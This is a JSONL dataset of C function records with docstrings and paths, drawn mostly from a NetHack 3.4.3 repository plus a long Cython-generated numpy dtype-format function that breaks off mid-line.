{"docstring": "/* get event from the queue and delete it */\n", "func_signal": "PMSNHEvent mswin_input_pop()", "code": "{\n\tPMSNHEvent retval;\n\n\tif( !nhi_init_input ) mswin_nh_input_init();\n\n\tif( nhi_read_pos!=nhi_write_pos ) {\n\t\tretval = &nhi_input_buffer[nhi_read_pos];\n\t\tnhi_read_pos = (nhi_read_pos+1) % NH_INPUT_BUFFER_SIZE;\n\t} else {\n\t\tretval = NULL;\n\t}\n\n\treturn retval;\n}", "path": "sys\\wince\\mhinput.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "// int    __cdecl putchar(int);\n", "func_signal": "int    __cdecl puts(const char * s)", "code": "{\n\tTCHAR wbuf[4096];\n\tNH_A2W(s, wbuf, 4096);\n\tMessageBox(NULL, wbuf, _T(\"stdout\"), MB_OK);\n\treturn 0;\n}", "path": "sys\\wince\\celib.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/*\n *\tOutput the dungon definition into a file.\n *\n *\tThe file will have the following format:\n *\n *\t[ nethack version ID ]\n *\t[ number of dungeons ]\n *\t[ first dungeon struct ]\n *\t[ levels for the first dungeon ]\n *\t  ...\n *\t[ branches for the first dungeon ]\n *\t  ...\n *\t[ second dungeon struct ]\n *\t  ...\n */\n", "func_signal": "void\noutput_dgn()", "code": "{\n\tint\tnd, cl = 0, nl = 0,\n\t\t    cb = 0, nb = 0;\n\tstatic struct version_info version_data = {\n\t\t\tVERSION_NUMBER, VERSION_FEATURES,\n\t\t\tVERSION_SANITY1, VERSION_SANITY2\n\t};\n\n\tif(++n_dgns <= 0) {\n\t    yyerror(\"FATAL - no dungeons were defined.\");\n\t    exit(EXIT_FAILURE);\n\t}\n\n\tif (fwrite((char *)&version_data, sizeof version_data, 1, yyout) != 1) {\n\t    yyerror(\"FATAL - output failure.\");\n\t    exit(EXIT_FAILURE);\n\t}\n\n\t(void) fwrite((char *)&n_dgns, sizeof(int), 1, yyout);\n\tfor (nd = 0; nd < n_dgns; nd++) {\n\t    (void) fwrite((char *)&tmpdungeon[nd], sizeof(struct tmpdungeon),\n\t\t\t\t\t\t\t1, yyout);\n\n\t    nl += tmpdungeon[nd].levels;\n\t    for(; cl < nl; cl++)\n\t\t(void) fwrite((char *)&tmplevel[cl], sizeof(struct tmplevel),\n\t\t\t\t\t\t\t1, yyout);\n\n\t    nb += tmpdungeon[nd].branches;\n\t    for(; cb < nb; cb++)\n\t\t(void) fwrite((char *)&tmpbranch[cb], sizeof(struct tmpbranch),\n\t\t\t\t\t\t\t1, yyout);\n\t}\n\t/* apparently necessary for Think C 5.x, otherwise harmless */\n\t(void) fflush(yyout);\n}", "path": "sys\\share\\dgn_yacc.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/*\n *\tConsistancy checking routines:\n *\n *\t- A dungeon must have a unique name.\n *\t- A dungeon must have a originating \"branch\" command\n *\t  (except, of course, for the first dungeon).\n *\t- A dungeon must have a proper depth (at least (1, 0)).\n */\n", "func_signal": "int\ncheck_dungeon()", "code": "{\n\tint i;\n\n\tfor(i = 0; i < n_dgns; i++)\n\t    if(!strcmp(tmpdungeon[i].name, tmpdungeon[n_dgns].name)) {\n\t\tyyerror(\"Duplicate dungeon name.\");\n\t\treturn(0);\n\t    }\n\n\tif(n_dgns)\n\t  for(i = 0; i < n_brs - tmpdungeon[n_dgns].branches; i++) {\n\t    if(!strcmp(tmpbranch[i].name, tmpdungeon[n_dgns].name)) break;\n\n\t    if(i >= n_brs - tmpdungeon[n_dgns].branches) {\n\t\tyyerror(\"Dungeon cannot be reached.\");\n\t\treturn(0);\n\t    }\n\t  }\n\n\tif(tmpdungeon[n_dgns].lev.base <= 0 ||\n\t   tmpdungeon[n_dgns].lev.rand < 0) {\n\t\tyyerror(\"Invalid dungeon depth specified.\");\n\t\treturn(0);\n\t}\n\treturn(1);\t/* OK */\n}", "path": "sys\\share\\dgn_yacc.c", "repo_name": "Vanilla-NetHack/NetHack-3.4.3", "stars": 197, "license": "None", "language": "c", "size": 6644}
{"docstring": "/* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":771\n *     return PyArray_MultiIterNew(5, <void*>a, <void*>b, <void*>c, <void*> d, <void*> e)\n * \n * cdef inline char* _util_dtypestring(dtype descr, char* f, char* end, int* offset) except NULL:             # <<<<<<<<<<<<<<\n *     # Recursive utility function used in __getbuffer__ to get format\n *     # string. The new location in the format string is returned.\n */\n", "func_signal": "static CYTHON_INLINE char *__pyx_f_5numpy__util_dtypestring(PyArray_Descr *__pyx_v_descr, char *__pyx_v_f, char *__pyx_v_end, int *__pyx_v_offset)", "code": "{\n  PyArray_Descr *__pyx_v_child;\n  int __pyx_v_endian_detector;\n  int __pyx_v_little_endian;\n  PyObject *__pyx_v_fields;\n  PyObject *__pyx_v_childname;\n  PyObject *__pyx_v_new_offset;\n  PyObject *__pyx_v_t;\n  char *__pyx_r;\n  Py_ssize_t __pyx_t_1;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  PyObject *__pyx_t_4 = NULL;\n  PyObject *__pyx_t_5 = NULL;\n  int __pyx_t_6;\n  int __pyx_t_7;\n  int __pyx_t_8;\n  int __pyx_t_9;\n  long __pyx_t_10;\n  char *__pyx_t_11;\n  __Pyx_RefNannySetupContext(\"_util_dtypestring\");\n  __pyx_v_child = ((PyArray_Descr *)Py_None); __Pyx_INCREF(Py_None);\n  __pyx_v_fields = ((PyObject*)Py_None); __Pyx_INCREF(Py_None);\n  __pyx_v_childname = Py_None; __Pyx_INCREF(Py_None);\n  __pyx_v_new_offset = Py_None; __Pyx_INCREF(Py_None);\n  __pyx_v_t = Py_None; __Pyx_INCREF(Py_None);\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":778\n *     cdef int delta_offset\n *     cdef tuple i\n *     cdef int endian_detector = 1             # <<<<<<<<<<<<<<\n *     cdef bint little_endian = ((<char*>&endian_detector)[0] != 0)\n *     cdef tuple fields\n */\n  __pyx_v_endian_detector = 1;\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":779\n *     cdef tuple i\n *     cdef int endian_detector = 1\n *     cdef bint little_endian = ((<char*>&endian_detector)[0] != 0)             # <<<<<<<<<<<<<<\n *     cdef tuple fields\n * \n */\n  __pyx_v_little_endian = ((((char *)(&__pyx_v_endian_detector))[0]) != 0);\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":782\n *     cdef tuple fields\n * \n *     for childname in descr.names:             # <<<<<<<<<<<<<<\n *         fields = descr.fields[childname]\n *         child, new_offset = fields\n */\n  if (unlikely(__pyx_v_descr->names == Py_None)) {\n    PyErr_SetString(PyExc_TypeError, \"'NoneType' object is not iterable\"); {__pyx_filename = __pyx_f[1]; __pyx_lineno = 782; __pyx_clineno = __LINE__; goto __pyx_L1_error;} \n  }\n  __pyx_t_1 = 0; __pyx_t_2 = ((PyObject *)__pyx_v_descr->names); __Pyx_INCREF(__pyx_t_2);\n  for (;;) {\n    if (__pyx_t_1 >= PyTuple_GET_SIZE(__pyx_t_2)) break;\n    __pyx_t_3 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_1); __Pyx_INCREF(__pyx_t_3); __pyx_t_1++;\n    __Pyx_DECREF(__pyx_v_childname);\n    __pyx_v_childname = __pyx_t_3;\n    __pyx_t_3 = 0;\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":783\n * \n *     for childname in descr.names:\n *         fields = descr.fields[childname]             # <<<<<<<<<<<<<<\n *         child, new_offset = fields\n * \n */\n    __pyx_t_3 = PyObject_GetItem(__pyx_v_descr->fields, __pyx_v_childname); if (!__pyx_t_3) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 783; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    __Pyx_GOTREF(__pyx_t_3);\n    if (!(likely(PyTuple_CheckExact(__pyx_t_3))||((__pyx_t_3) == Py_None)||(PyErr_Format(PyExc_TypeError, \"Expected tuple, got %.200s\", Py_TYPE(__pyx_t_3)->tp_name), 0))) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 783; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    __Pyx_DECREF(((PyObject *)__pyx_v_fields));\n    __pyx_v_fields = ((PyObject*)__pyx_t_3);\n    __pyx_t_3 = 0;\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":784\n *     for childname in descr.names:\n *         fields = descr.fields[childname]\n *         child, new_offset = fields             # <<<<<<<<<<<<<<\n * \n *         if (end - f) - (new_offset - offset[0]) < 15:\n */\n    if (likely(((PyObject *)__pyx_v_fields) != Py_None) && likely(PyTuple_GET_SIZE(((PyObject *)__pyx_v_fields)) == 2)) {\n      PyObject* tuple = ((PyObject *)__pyx_v_fields);\n      __pyx_t_3 = PyTuple_GET_ITEM(tuple, 0); __Pyx_INCREF(__pyx_t_3);\n      if (!(likely(((__pyx_t_3) == Py_None) || likely(__Pyx_TypeTest(__pyx_t_3, __pyx_ptype_5numpy_dtype))))) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 784; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __pyx_t_4 = PyTuple_GET_ITEM(tuple, 1); __Pyx_INCREF(__pyx_t_4);\n      __Pyx_DECREF(((PyObject *)__pyx_v_child));\n      __pyx_v_child = ((PyArray_Descr *)__pyx_t_3);\n      __pyx_t_3 = 0;\n      __Pyx_DECREF(__pyx_v_new_offset);\n      __pyx_v_new_offset = __pyx_t_4;\n      __pyx_t_4 = 0;\n    } else {\n      __Pyx_UnpackTupleError(((PyObject *)__pyx_v_fields), 2);\n      {__pyx_filename = __pyx_f[1]; __pyx_lineno = 784; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":786\n *         child, new_offset = fields\n * \n *         if (end - f) - (new_offset - offset[0]) < 15:             # <<<<<<<<<<<<<<\n *             raise RuntimeError(u\"Format string allocated too short, see comment in numpy.pxd\")\n * \n */\n    __pyx_t_4 = PyInt_FromLong((__pyx_v_end - __pyx_v_f)); if (unlikely(!__pyx_t_4)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 786; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    __Pyx_GOTREF(__pyx_t_4);\n    __pyx_t_3 = PyInt_FromLong((__pyx_v_offset[0])); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 786; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    __Pyx_GOTREF(__pyx_t_3);\n    __pyx_t_5 = PyNumber_Subtract(__pyx_v_new_offset, __pyx_t_3); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 786; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __pyx_t_3 = PyNumber_Subtract(__pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 786; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    __Pyx_GOTREF(__pyx_t_3);\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __pyx_t_5 = PyObject_RichCompare(__pyx_t_3, __pyx_int_15, Py_LT); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 786; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 786; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    if (__pyx_t_6) {\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":787\n * \n *         if (end - f) - (new_offset - offset[0]) < 15:\n *             raise RuntimeError(u\"Format string allocated too short, see comment in numpy.pxd\")             # <<<<<<<<<<<<<<\n * \n *         if ((child.byteorder == '>' and little_endian) or\n */\n      __pyx_t_5 = PyObject_Call(__pyx_builtin_RuntimeError, ((PyObject *)__pyx_k_tuple_16), NULL); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 787; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_Raise(__pyx_t_5, 0, 0);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      {__pyx_filename = __pyx_f[1]; __pyx_lineno = 787; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      goto __pyx_L5;\n    }\n    __pyx_L5:;\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":789\n *             raise RuntimeError(u\"Format string allocated too short, see comment in numpy.pxd\")\n * \n *         if ((child.byteorder == '>' and little_endian) or             # <<<<<<<<<<<<<<\n *             (child.byteorder == '<' and not little_endian)):\n *             raise ValueError(u\"Non-native byte order not supported\")\n */\n    __pyx_t_6 = (__pyx_v_child->byteorder == '>');\n    if (__pyx_t_6) {\n      __pyx_t_7 = __pyx_v_little_endian;\n    } else {\n      __pyx_t_7 = __pyx_t_6;\n    }\n    if (!__pyx_t_7) {\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":790\n * \n *         if ((child.byteorder == '>' and little_endian) or\n *             (child.byteorder == '<' and not little_endian)):             # <<<<<<<<<<<<<<\n *             raise ValueError(u\"Non-native byte order not supported\")\n *             # One could encode it in the format string and have Cython\n */\n      __pyx_t_6 = (__pyx_v_child->byteorder == '<');\n      if (__pyx_t_6) {\n        __pyx_t_8 = (!__pyx_v_little_endian);\n        __pyx_t_9 = __pyx_t_8;\n      } else {\n        __pyx_t_9 = __pyx_t_6;\n      }\n      __pyx_t_6 = __pyx_t_9;\n    } else {\n      __pyx_t_6 = __pyx_t_7;\n    }\n    if (__pyx_t_6) {\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":791\n *         if ((child.byteorder == '>' and little_endian) or\n *             (child.byteorder == '<' and not little_endian)):\n *             raise ValueError(u\"Non-native byte order not supported\")             # <<<<<<<<<<<<<<\n *             # One could encode it in the format string and have Cython\n *             # complain instead, BUT: < and > in format strings also imply\n */\n      __pyx_t_5 = PyObject_Call(__pyx_builtin_ValueError, ((PyObject *)__pyx_k_tuple_17), NULL); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 791; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_Raise(__pyx_t_5, 0, 0);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      {__pyx_filename = __pyx_f[1]; __pyx_lineno = 791; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      goto __pyx_L6;\n    }\n    __pyx_L6:;\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":801\n * \n *         # Output padding bytes\n *         while offset[0] < new_offset:             # <<<<<<<<<<<<<<\n *             f[0] = 120 # \"x\"; pad byte\n *             f += 1\n */\n    while (1) {\n      __pyx_t_5 = PyInt_FromLong((__pyx_v_offset[0])); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 801; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_3 = PyObject_RichCompare(__pyx_t_5, __pyx_v_new_offset, Py_LT); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 801; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 801; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      if (!__pyx_t_6) break;\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":802\n *         # Output padding bytes\n *         while offset[0] < new_offset:\n *             f[0] = 120 # \"x\"; pad byte             # <<<<<<<<<<<<<<\n *             f += 1\n *             offset[0] += 1\n */\n      (__pyx_v_f[0]) = 120;\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":803\n *         while offset[0] < new_offset:\n *             f[0] = 120 # \"x\"; pad byte\n *             f += 1             # <<<<<<<<<<<<<<\n *             offset[0] += 1\n * \n */\n      __pyx_v_f = (__pyx_v_f + 1);\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":804\n *             f[0] = 120 # \"x\"; pad byte\n *             f += 1\n *             offset[0] += 1             # <<<<<<<<<<<<<<\n * \n *         offset[0] += child.itemsize\n */\n      __pyx_t_10 = 0;\n      (__pyx_v_offset[__pyx_t_10]) = ((__pyx_v_offset[__pyx_t_10]) + 1);\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":806\n *             offset[0] += 1\n * \n *         offset[0] += child.itemsize             # <<<<<<<<<<<<<<\n * \n *         if not PyDataType_HASFIELDS(child):\n */\n    __pyx_t_10 = 0;\n    (__pyx_v_offset[__pyx_t_10]) = ((__pyx_v_offset[__pyx_t_10]) + __pyx_v_child->elsize);\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":808\n *         offset[0] += child.itemsize\n * \n *         if not PyDataType_HASFIELDS(child):             # <<<<<<<<<<<<<<\n *             t = child.type_num\n *             if end - f < 5:\n */\n    __pyx_t_6 = (!PyDataType_HASFIELDS(__pyx_v_child));\n    if (__pyx_t_6) {\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":809\n * \n *         if not PyDataType_HASFIELDS(child):\n *             t = child.type_num             # <<<<<<<<<<<<<<\n *             if end - f < 5:\n *                 raise RuntimeError(u\"Format string allocated too short.\")\n */\n      __pyx_t_3 = PyInt_FromLong(__pyx_v_child->type_num); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 809; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __Pyx_DECREF(__pyx_v_t);\n      __pyx_v_t = __pyx_t_3;\n      __pyx_t_3 = 0;\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":810\n *         if not PyDataType_HASFIELDS(child):\n *             t = child.type_num\n *             if end - f < 5:             # <<<<<<<<<<<<<<\n *                 raise RuntimeError(u\"Format string allocated too short.\")\n * \n */\n      __pyx_t_6 = ((__pyx_v_end - __pyx_v_f) < 5);\n      if (__pyx_t_6) {\n\n        /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":811\n *             t = child.type_num\n *             if end - f < 5:\n *                 raise RuntimeError(u\"Format string allocated too short.\")             # <<<<<<<<<<<<<<\n * \n *             # Until ticket #99 is fixed, use integers to avoid warnings\n */\n        __pyx_t_3 = PyObject_Call(__pyx_builtin_RuntimeError, ((PyObject *)__pyx_k_tuple_19), NULL); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 811; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n        __Pyx_GOTREF(__pyx_t_3);\n        __Pyx_Raise(__pyx_t_3, 0, 0);\n        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n        {__pyx_filename = __pyx_f[1]; __pyx_lineno = 811; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n        goto __pyx_L10;\n      }\n      __pyx_L10:;\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":814\n * \n *             # Until ticket #99 is fixed, use integers to avoid warnings\n *             if   t == NPY_BYTE:        f[0] =  98 #\"b\"             # <<<<<<<<<<<<<<\n *             elif t == NPY_UBYTE:       f[0] =  66 #\"B\"\n *             elif t == NPY_SHORT:       f[0] = 104 #\"h\"\n */\n      __pyx_t_3 = PyInt_FromLong(NPY_BYTE); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 814; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __pyx_t_5 = PyObject_RichCompare(__pyx_v_t, __pyx_t_3, Py_EQ); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 814; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 814; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 98;\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":815\n *             # Until ticket #99 is fixed, use integers to avoid warnings\n *             if   t == NPY_BYTE:        f[0] =  98 #\"b\"\n *             elif t == NPY_UBYTE:       f[0] =  66 #\"B\"             # <<<<<<<<<<<<<<\n *             elif t == NPY_SHORT:       f[0] = 104 #\"h\"\n *             elif t == NPY_USHORT:      f[0] =  72 #\"H\"\n */\n      __pyx_t_5 = PyInt_FromLong(NPY_UBYTE); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 815; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_3 = PyObject_RichCompare(__pyx_v_t, __pyx_t_5, Py_EQ); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 815; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 815; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 66;\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":816\n *             if   t == NPY_BYTE:        f[0] =  98 #\"b\"\n *             elif t == NPY_UBYTE:       f[0] =  66 #\"B\"\n *             elif t == NPY_SHORT:       f[0] = 104 #\"h\"             # <<<<<<<<<<<<<<\n *             elif t == NPY_USHORT:      f[0] =  72 #\"H\"\n *             elif t == NPY_INT:         f[0] = 105 #\"i\"\n */\n      __pyx_t_3 = PyInt_FromLong(NPY_SHORT); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 816; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __pyx_t_5 = PyObject_RichCompare(__pyx_v_t, __pyx_t_3, Py_EQ); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 816; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 816; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 104;\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":817\n *             elif t == NPY_UBYTE:       f[0] =  66 #\"B\"\n *             elif t == NPY_SHORT:       f[0] = 104 #\"h\"\n *             elif t == NPY_USHORT:      f[0] =  72 #\"H\"             # <<<<<<<<<<<<<<\n *             elif t == NPY_INT:         f[0] = 105 #\"i\"\n *             elif t == NPY_UINT:        f[0] =  73 #\"I\"\n */\n      __pyx_t_5 = PyInt_FromLong(NPY_USHORT); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 817; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_3 = PyObject_RichCompare(__pyx_v_t, __pyx_t_5, Py_EQ); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 817; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 817; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 72;\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":818\n *             elif t == NPY_SHORT:       f[0] = 104 #\"h\"\n *             elif t == NPY_USHORT:      f[0] =  72 #\"H\"\n *             elif t == NPY_INT:         f[0] = 105 #\"i\"             # <<<<<<<<<<<<<<\n *             elif t == NPY_UINT:        f[0] =  73 #\"I\"\n *             elif t == NPY_LONG:        f[0] = 108 #\"l\"\n */\n      __pyx_t_3 = PyInt_FromLong(NPY_INT); if (unlikely(!__pyx_t_3)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 818; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_3);\n      __pyx_t_5 = PyObject_RichCompare(__pyx_v_t, __pyx_t_3, Py_EQ); if (unlikely(!__pyx_t_5)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 818; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_6 < 0)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 818; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (__pyx_t_6) {\n        (__pyx_v_f[0]) = 105;\n        goto __pyx_L11;\n      }\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":819\n *             elif t == NPY_USHORT:      f[0] =  72 #\"H\"\n *             elif t == NPY_INT:         f[0] = 105 #\"i\"\n *             elif t == NPY_UINT:        f[0] =  73 #\"I\"             # <<<<<<<<<<<<<<\n *             elif t == NPY_LONG:        f[0] = 108 #\"l\"\n *             elif t == NPY_ULONG:       f[0] = 76  #\"L\"\n */\n      __pyx_t_5 = PyInt_FromLong(NPY_UINT); if (unlikely(!__pyx_t_5)) {__pyx_filename = 